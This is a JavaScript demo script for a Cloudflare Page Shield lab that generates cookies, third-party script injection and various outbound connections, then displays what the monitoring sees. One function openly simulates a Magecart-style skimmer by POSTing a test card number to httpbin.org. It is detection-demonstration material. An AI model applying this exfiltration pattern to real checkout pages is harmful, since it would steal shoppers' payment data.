/*
 * Page Shield origin demo -- first-party script served by Apache from
 * https://www.pimenta.fun/page-shield/page-shield-origin/origin-demo.js
 *
 * What it does (all of it is visible to Cloudflare Page Shield / Client-side security):
 *   - sets two cookies with document.cookie  -> Page Shield cookie type "Unknown"
 *   - injects a third-party script at runtime (axios from unpkg.com)
 *   - opens connections with fetch, XMLHttpRequest, sendBeacon, axios, WebSocket
 *   - renders a live inventory of scripts, connections, cookies and the CSP
 *     report-only violations the browser sends to Cloudflare
 *
 * The card data sent to httpbin.org is a public TEST number, used only to
 * simulate what a skimmer (Magecart-style) connection looks like.
 */
(function () {
  'use strict';

  var PAGE = location.origin + '/page-shield/page-shield-origin/';
  var HTTPBIN = 'https://httpbin.org';
  var AXIOS_URL = 'https://unpkg.com/axios@1.7.9/dist/axios.min.js';
  var WS_URL = 'wss://ws.postman-echo.com/raw';

  var violations = window.__psViolations || (window.__psViolations = []);
  var connections = [];
  var headResult = null;

  var LIBS = [
    { match: 'origin-demo.js', check: function () { return 'running'; } },
    { match: '/jquery/', check: function () { return window.jQuery ? 'jQuery ' + window.jQuery.fn.jquery : ''; } },
    { match: '/lodash', check: function () { return window._ && window._.VERSION ? 'lodash ' + window._.VERSION : ''; } },
    { match: '/dayjs', check: function () { return window.dayjs ? 'dayjs ' + window.dayjs().format('YYYY-MM-DD') : ''; } },
    { match: '/axios', check: function () { return window.axios ? 'axios ' + (window.axios.VERSION || '') : ''; } }
  ];

  var EXPECTED_COOKIES = [
    { name: 'ps_origin_session', setBy: 'Origin (Apache Set-Cookie)', type: 'First-party', httpOnly: true,
      attrs: 'Path=/page-shield/page-shield-origin/; Secure; HttpOnly; SameSite=Strict', life: 'Session' },
    { name: 'ps_origin_pref', setBy: 'Origin (Apache Set-Cookie)', type: 'First-party', httpOnly: false,
      attrs: 'Path=/; Max-Age=86400; Secure; SameSite=Lax', life: '1 day (Max-Age)' },
    { name: 'ps_origin_tracker', setBy: 'Origin (Apache Set-Cookie)', type: 'First-party', httpOnly: false,
      attrs: 'Domain=pimenta.fun; Path=/; Expires=Fri, 31 Dec 2027 23:59:59 GMT; Secure; SameSite=None', life: 'Until 2027-12-31 (Expires)' },
    { name: 'ps_origin_weak', setBy: 'Origin (Apache Set-Cookie)', type: 'First-party', httpOnly: false,
      attrs: 'Path=/ (no Secure, no HttpOnly, no SameSite)', life: 'Session' },
    { name: 'ps_js_cart', setBy: 'origin-demo.js (document.cookie)', type: 'Unknown', httpOnly: false,
      attrs: 'Path=/page-shield/page-shield-origin/; Max-Age=3600; Secure; SameSite=Lax', life: '1 hour' },
    { name: 'ps_js_ab', setBy: 'origin-demo.js (document.cookie)', type: 'Unknown', httpOnly: false,
      attrs: 'Path=/; Max-Age=604800; Secure; SameSite=Lax', life: '7 days' }
  ];

  var TRACE_HELP = {
    fl: 'Cloudflare front-line server id', h: 'Hostname requested', ip: 'Client IP seen by Cloudflare',
    ts: 'Server timestamp', visit_scheme: 'Scheme used', uag: 'User-Agent', colo: 'Cloudflare data center (IATA)',
    sliver: 'Internal release slice', http: 'HTTP version browser to edge', loc: 'Country (geo IP)',
    tls: 'TLS version browser to edge', sni: 'SNI mode', warp: 'Cloudflare WARP in use',
    gateway: 'Cloudflare Gateway in use', rbi: 'Browser Isolation in use', kex: 'TLS key exchange group'
  };

  // ---------- helpers ----------
  function $(id) { return document.getElementById(id); }
  function esc(v) {
    return String(v == null ? '' : v).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }
  function tag(cls, text) { return '<span class="tag2 ' + cls + '">' + esc(text) + '</span>'; }
  function clock() { return new Date().toISOString().slice(11, 19); }
  function hostOf(u) { try { return new URL(u, location.href).host; } catch (e) { return ''; } }
  function isMonitoring(v) { return /script_monitor/.test(v.policy || ''); }
  function reportFor(url, directivePrefix) {
    if (!url) return null;
    for (var i = 0; i < violations.length; i++) {
      var v = violations[i];
      if (directivePrefix && (v.directive || '').indexOf(directivePrefix) !== 0) continue;
      if (!v.blocked) continue;
      if (v.blocked === url || url.indexOf(v.blocked) === 0 || v.blocked.indexOf(url.split('?')[0]) === 0) return v;
    }
    return null;
  }
  function reportTag(v) {
    if (!v) return tag('opt', 'no report yet');
    return isMonitoring(v) ? tag('have', 'reported to Page Shield') : tag('cf', 'content security rule (' + v.disposition + ')');
  }

  var renderQueued = false;
  function scheduleRender() {
    if (renderQueued) return;
    renderQueued = true;
    setTimeout(function () { renderQueued = false; renderAll(); }, 120);
  }
  window.__psOnViolation = scheduleRender;

  // ---------- cookies set by JavaScript (Page Shield type: Unknown) ----------
  function setJsCookies() {
    document.cookie = 'ps_js_cart=3-items; Path=/page-shield/page-shield-origin/; Max-Age=3600; Secure; SameSite=Lax';
    document.cookie = 'ps_js_ab=variant-b; Path=/; Max-Age=604800; Secure; SameSite=Lax';
  }

  // ---------- connections ----------
  function record(c) { c.t = clock(); c.status = 'pending'; connections.push(c); scheduleRender(); return c; }
  function done(c, patch) { for (var k in patch) c[k] = patch[k]; scheduleRender(); }

  function doFetch(label, url, opts, initiator) {
    var c = record({ label: label, url: url, api: 'fetch', method: (opts && opts.method) || 'GET', initiator: initiator || 'origin-demo.js' });
    var t0 = performance.now();
    var ctrl = window.AbortController ? new AbortController() : null;
    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, 10000);
    opts = opts || {};
    if (ctrl) opts.signal = ctrl.signal;
    return fetch(url, opts).then(function (r) {
      clearTimeout(timer);
      done(c, { status: r.status, ms: Math.round(performance.now() - t0) });
      return r;
    }).catch(function (e) {
      clearTimeout(timer);
      done(c, { status: e.name === 'AbortError' ? 'timeout' : 'error', note: e.message });
      return null;
    });
  }

  function doXhr(label, url) {
    var c = record({ label: label, url: url, api: 'XMLHttpRequest', method: 'GET', initiator: 'origin-demo.js' });
    var t0 = performance.now();
    var x = new XMLHttpRequest();
    x.open('GET', url);
    x.timeout = 8000;
    x.onload = function () { done(c, { status: x.status, ms: Math.round(performance.now() - t0) }); };
    x.onerror = function () { done(c, { status: 'error', note: 'network/CORS error' }); };
    x.ontimeout = function () { done(c, { status: 'timeout' }); };
    x.send();
  }

  function doBeacon() {
    var url = HTTPBIN + '/post';
    var c = record({ label: 'Analytics-style beacon', url: url, api: 'sendBeacon', method: 'POST', initiator: 'origin-demo.js' });
    var ok = false;
    try { ok = navigator.sendBeacon(url, JSON.stringify({ event: 'page_view', page: PAGE, ts: Date.now() })); } catch (e) { ok = false; }
    done(c, { status: ok ? 'queued' : 'not queued', note: 'fire-and-forget, no response visible' });
  }

  function doPixel() {
    var url = HTTPBIN + '/status/204?pixel=origin-demo';
    var c = record({ label: 'Image pixel (img-src)', url: url, api: 'Image()', method: 'GET', initiator: 'origin-demo.js', notMonitored: true });
    var img = new Image();
    img.onload = img.onerror = function () { done(c, { status: 'sent', note: 'img-src is not in the monitoring policy: not a Page Shield connection' }); };
    img.src = url;
  }

  function injectAxios() {
    return new Promise(function (resolve) {
      if (window.axios) return resolve(true);
      var s = document.createElement('script');
      s.src = AXIOS_URL;
      s.async = true;
      s.setAttribute('data-injected', 'origin-demo.js');
      s.onload = function () { resolve(true); scheduleRender(); };
      s.onerror = function () { resolve(false); scheduleRender(); };
      document.head.appendChild(s);
    });
  }

  function doAxios() {
    var url = HTTPBIN + '/get?via=axios&page=page-shield-origin';
    if (!window.axios) {
      var c0 = record({ label: 'Connection from third-party script', url: url, api: 'axios', method: 'GET', initiator: 'axios (unpkg.com)' });
      done(c0, { status: 'skipped', note: 'axios did not load (blocked by CSP or network)' });
      return;
    }
    var c = record({ label: 'Connection from third-party script', url: url, api: 'axios', method: 'GET', initiator: 'axios (unpkg.com)' });
    var t0 = performance.now();
    window.axios.get(url, { timeout: 8000 }).then(function (r) {
      done(c, { status: r.status, ms: Math.round(performance.now() - t0) });
    }).catch(function (e) {
      done(c, { status: 'error', note: e.message });
    });
  }

  function openWebSocket() {
    var c = record({ label: 'WebSocket echo', url: WS_URL, api: 'WebSocket', method: 'WS', initiator: 'origin-demo.js' });
    var ws;
    try { ws = new WebSocket(WS_URL); } catch (e) { done(c, { status: 'error', note: e.message }); return; }
    var t0 = performance.now();
    var timer = setTimeout(function () { try { ws.close(); } catch (e) {} done(c, { status: 'timeout' }); }, 8000);
    ws.onopen = function () { ws.send('hello from page-shield-origin'); };
    ws.onmessage = function (m) {
      clearTimeout(timer);
      done(c, { status: 'echo ok', ms: Math.round(performance.now() - t0), note: 'received: ' + String(m.data).slice(0, 40) });
      ws.close();
    };
    ws.onerror = function () { clearTimeout(timer); done(c, { status: 'error', note: 'WebSocket failed' }); };
  }

  function runConnections(includeFirstParty) {
    if (includeFirstParty) {
      doFetch('Cloudflare trace (first-party)', location.origin + '/cdn-cgi/trace', { cache: 'no-store' })
        .then(function (r) { return r && r.ok ? r.text() : ''; }).then(renderTrace);
      doFetch('Response headers of this page (HEAD)', PAGE, { method: 'HEAD', cache: 'no-store', credentials: 'same-origin' })
        .then(function (r) { headResult = r; renderHeaders(); });
    }
    doXhr('Lab API health (other subdomain, CORS)', 'https://api.pimenta.fun/health');
    doFetch('Simulated skimmer exfiltration (TEST card)', HTTPBIN + '/anything/checkout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'Demo Only', card: '4111 1111 1111 1111', exp: '12/30', cvv: '123', page: PAGE })
    });
    doBeacon();
    doPixel();
    injectAxios().then(doAxios);
  }

  // ---------- renderers ----------
  function renderTrace(text) {
    var body = $('traceBody');
    if (!body) return;
    if (!text) { body.innerHTML = '<tr><td colspan="3">/cdn-cgi/trace not reachable</td></tr>'; return; }
    var rows = text.trim().split('\n').map(function (line) {
      var i = line.indexOf('=');
      var k = line.slice(0, i), v = line.slice(i + 1);
      return '<tr><td><code>' + esc(k) + '</code></td><td class="mono">' + esc(v) + '</td><td>' + esc(TRACE_HELP[k] || '') + '</td></tr>';
    });
    body.innerHTML = rows.join('');
  }

  var HEADER_HELP = {
    'content-security-policy-report-only': 'Page Shield monitoring header (sampled) and/or your log rules',
    'content-security-policy': 'Your content security (allow) rules: enforced',
    'cf-ray': 'Cloudflare request id + data center',
    'cf-cache-status': 'Cache result (HTML is DYNAMIC by default)',
    'server': 'cloudflare = proxied through the edge',
    'x-served-by': 'Set by this folder .htaccess on Apache (proves origin served it)',
    'x-pimenta-lab': 'Set by Apache shared security headers',
    'cache-control': 'no-store from .htaccess so cookies are set on every view',
    'strict-transport-security': 'HSTS from Apache',
    'server-timing': 'Timing metrics added by Cloudflare/origin',
    'alt-svc': 'HTTP/3 advertisement from Cloudflare',
    'nel': 'Network Error Logging (Cloudflare)',
    'report-to': 'Reporting API endpoint (Cloudflare)'
  };

  function renderHeaders() {
    var body = $('headersBody');
    if (!body) return;
    if (!headResult) { body.innerHTML = '<tr><td colspan="3">HEAD request failed</td></tr>'; return; }
    var rows = [];
    headResult.headers.forEach(function (value, name) {
      var help = HEADER_HELP[name] || '';
      var hl = name.indexOf('content-security-policy') === 0 || name === 'x-served-by';
      rows.push('<tr' + (hl ? ' class="hl"' : '') + '><td><code>' + esc(name) + '</code></td><td class="mono">' + esc(value) + '</td><td>' + esc(help) + '</td></tr>');
    });
    rows.push('<tr><td><code>set-cookie</code></td><td class="mono">(hidden)</td><td>Browsers never expose Set-Cookie to JavaScript. Page Shield sees it at the edge.</td></tr>');
    body.innerHTML = rows.join('');
    var ro = headResult.headers.get('content-security-policy-report-only') || '';
    var served = headResult.headers.get('x-served-by');
    $('headNote').innerHTML =
      (/script_monitor/.test(ro)
        ? tag('have', 'monitoring header present on this HEAD response')
        : tag('opt', 'no monitoring header on this HEAD response (sampled)')) + ' ' +
      (served ? tag('have', 'origin .htaccess active') : tag('gap', 'X-Served-By missing: .htaccess not deployed?'));
  }

  function renderNav() {
    var body = $('navBody');
    if (!body) return;
    var n = (performance.getEntriesByType('navigation') || [])[0];
    if (!n) { body.innerHTML = '<tr><td colspan="2">Navigation Timing not available</td></tr>'; return; }
    var st = (n.serverTiming || []).map(function (s) { return s.name + (s.duration ? '=' + s.duration.toFixed(1) + 'ms' : '') + (s.description ? ' (' + s.description + ')' : ''); });
    var rows = [
      ['Protocol (browser to Cloudflare)', n.nextHopProtocol || 'n/a'],
      ['Page URL', location.href],
      ['Time to first byte', Math.round(n.responseStart - n.requestStart) + ' ms'],
      ['DOM content loaded', Math.round(n.domContentLoadedEventEnd) + ' ms'],
      ['HTML transfer size', n.transferSize ? n.transferSize + ' bytes' : 'n/a'],
      ['Server-Timing', st.length ? st.join(' | ') : 'none'],
      ['Secure context', String(window.isSecureContext)],
      ['User agent', navigator.userAgent]
    ];
    body.innerHTML = rows.map(function (r) { return '<tr><td>' + esc(r[0]) + '</td><td class="mono">' + esc(r[1]) + '</td></tr>'; }).join('');
  }

  function scriptList() {
    var list = [], seen = {};
    Array.prototype.forEach.call(document.scripts, function (s, i) {
      var src = s.src || '';
      var key = src || 'inline-' + i;
      if (seen[key]) return;
      seen[key] = true;
      list.push(s);
    });
    return list;
  }

  function renderScripts() {
    var body = $('scriptsBody');
    if (!body) return 0;
    var list = scriptList();
    var external = 0;
    body.innerHTML = list.map(function (s) {
      var src = s.src || '';
      if (src) external++;
      var host = src ? hostOf(src) : location.host;
      var party = !src ? tag('opt', 'inline') : host === location.host ? tag('have', 'first-party') : tag('cf', 'third-party');
      var how = !src ? 'inline &lt;script&gt;' :
        s.getAttribute('data-injected') ? 'injected at runtime by ' + esc(s.getAttribute('data-injected')) :
        s.defer ? '&lt;script defer&gt; in HTML' : s.async ? '&lt;script async&gt;' : '&lt;script&gt; in HTML';
      var lib = '';
      LIBS.forEach(function (l) { if (src.indexOf(l.match) !== -1) lib = l.check(); });
      var perf = src ? performance.getEntriesByName(src)[0] : null;
      var timing = perf ? Math.round(perf.duration) + ' ms' + (perf.nextHopProtocol ? ' / ' + perf.nextHopProtocol : '') : '';
      var entry = src ? reportTag(reportFor(src, 'script-src')) : tag('opt', 'not listed (unsafe-inline allowed)');
      return '<tr><td class="mono">' + esc(src || '(inline, ' + (s.textContent || '').trim().length + ' chars)') + '</td><td>' + how +
        '</td><td>' + party + '</td><td>' + esc(lib || (src ? 'loaded' : 'executed')) + (timing ? '<br><span class="muted-small">' + esc(timing) + '</span>' : '') +
        '</td><td>' + entry + '</td></tr>';
    }).join('');
    return external;
  }

  function renderConns() {
    var body = $('connBody');
    if (!body) return 0;
    var count = 0;
    body.innerHTML = connections.map(function (c) {
      if (!c.notMonitored) count++;
      var st = String(c.status);
      var cls = /^(2\d\d|queued|echo ok|sent)$/.test(st) ? 'have' : st === 'pending' ? 'opt' : 'gap';
      var rep = c.notMonitored ? tag('opt', 'not monitored (img-src)') : reportTag(reportFor(c.url, 'connect-src'));
      return '<tr><td class="mono">' + esc(c.t) + '</td><td><b>' + esc(c.label) + '</b><br><span class="mono">' + esc(c.method + ' ' + c.url) + '</span></td><td>' +
        esc(c.api) + '<br><span class="muted-small">by ' + esc(c.initiator) + '</span></td><td>' + tag(cls, st) +
        (c.ms != null ? ' <span class="muted-small">' + c.ms + ' ms</span>' : '') + (c.note ? '<br><span class="muted-small">' + esc(c.note) + '</span>' : '') +
        '</td><td>' + rep + '</td></tr>';
    }).join('') || '<tr><td colspan="5">No connections yet</td></tr>';
    return count;
  }

  function parseCookies() {
    var out = {};
    (document.cookie || '').split(/;\s*/).forEach(function (p) {
      if (!p) return;
      var i = p.indexOf('=');
      out[i === -1 ? p : p.slice(0, i)] = i === -1 ? '' : p.slice(i + 1);
    });
    return out;
  }

  function renderCookies() {
    var body = $('cookiesBody');
    if (!body) return 0;
    var jar = parseCookies();
    var known = {};
    var rows = EXPECTED_COOKIES.map(function (c) {
      known[c.name] = true;
      var visible = Object.prototype.hasOwnProperty.call(jar, c.name);
      var state = visible ? tag('have', 'present: ' + jar[c.name]) :
        c.httpOnly ? tag('cf', 'hidden from JS (HttpOnly)') : tag('gap', 'missing');
      return '<tr><td><code>' + esc(c.name) + '</code></td><td>' + esc(c.setBy) + '</td><td>' +
        (c.type === 'First-party' ? tag('have', 'First-party') : tag('opt', 'Unknown')) + '</td><td class="mono">' + esc(c.attrs) +
        '</td><td>' + esc(c.life) + '</td><td>' + state + '</td></tr>';
    });
    Object.keys(jar).forEach(function (name) {
      if (known[name]) return;
      rows.push('<tr><td><code>' + esc(name) + '</code></td><td>Other page / script / Cloudflare</td><td>' + tag('opt', 'depends') +
        '</td><td class="mono">(attributes not readable from JS)</td><td>?</td><td>' + tag('have', 'present') + '</td></tr>');
    });
    body.innerHTML = rows.join('');
    var originMissing = !Object.prototype.hasOwnProperty.call(jar, 'ps_origin_pref');
    $('cookieNote').style.display = originMissing ? 'block' : 'none';
    // + 1 for the HttpOnly session cookie: JS cannot see it, but it is set whenever the other origin cookies are.
    return Object.keys(jar).length + (originMissing || jar.ps_origin_session !== undefined ? 0 : 1);
  }

  function renderReports() {
    var body = $('reportsBody');
    if (!body) return 0;
    body.innerHTML = violations.map(function (v) {
      return '<tr><td class="mono">' + esc(v.t) + '</td><td><code>' + esc(v.directive) + '</code></td><td class="mono">' + esc(v.blocked) +
        '</td><td>' + (isMonitoring(v) ? tag('have', 'Page Shield monitor') : tag('cf', 'your rule')) + ' ' + esc(v.disposition) +
        '</td><td class="mono">' + esc((v.source || '').replace(location.origin, '') + (v.line ? ':' + v.line : '')) + '</td></tr>';
    }).join('') || '<tr><td colspan="5">No CSP reports captured in this page view.</td></tr>';
    var mon = violations.filter(isMonitoring).length;
    var other = violations.length - mon;
    $('sampleStatus').innerHTML = mon
      ? tag('have', 'This view was sampled') + ' Cloudflare added the monitoring header to this HTML response. The browser sent <b>' + mon + '</b> report(s) to Page Shield.'
      : other
        ? tag('cf', 'Rule headers only') + ' Reports came from your content security rules, not the sampled monitoring header. Reload to try for a sampled view.'
        : tag('opt', 'Not sampled (yet)') + ' The monitoring header is added to a sample of responses. Reload the page a few times; scripts and connections are still reported on sampled views.';
    return violations.length;
  }

  function renderAll() {
    var s = renderScripts();
    var c = renderConns();
    var k = renderCookies();
    var r = renderReports();
    $('mScripts').textContent = s;
    $('mConns').textContent = c;
    $('mCookies').textContent = k;
    $('mReports').textContent = r;
  }

  // ---------- boot ----------
  function boot() {
    setJsCookies();
    renderNav();
    renderAll();
    runConnections(true);
    $('rerunConns').addEventListener('click', function () { runConnections(true); });
    $('openWs').addEventListener('click', openWebSocket);
    $('refreshAll').addEventListener('click', function () { renderNav(); renderAll(); });
    window.addEventListener('load', function () { renderNav(); scheduleRender(); });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
  else boot();
})();
